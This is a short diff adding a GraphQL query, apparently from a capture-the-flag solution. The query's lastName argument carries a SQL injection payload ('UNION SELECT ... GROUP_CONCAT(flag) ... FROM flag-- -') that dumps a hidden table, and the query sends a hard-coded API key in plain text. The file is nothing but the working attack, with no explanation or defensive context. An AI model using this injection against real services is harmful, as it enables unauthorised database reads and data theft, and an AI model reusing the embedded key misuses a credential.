@@ -1,0 +1,6 @@
+{
+  customerByName(lastName: "asd' UNION SELECT 1,2,GROUP_CONCAT(flag),4 FROM flag-- -" apiKey: "0711a879ed751e63330a78a4b195bbad") {
+    id firstName lastName address
+  }
+
+}
